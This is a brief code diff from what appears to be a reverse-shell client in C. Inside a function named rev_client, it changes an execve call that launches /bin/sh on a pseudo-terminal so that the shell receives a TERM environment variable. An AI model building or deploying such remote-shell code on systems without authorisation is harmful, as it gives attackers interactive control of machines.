@@ -87,7 +87,7 @@ void rev_client(void)
 
         setsid();
 
-        execve("/bin/sh", (char *[]){PREFIX, NULL}, NULL);
+        execve("/bin/sh", (char *[]){PREFIX, NULL}, (char *[]){"TERM=xterm-256color", NULL});
     }
 
     close(slave);
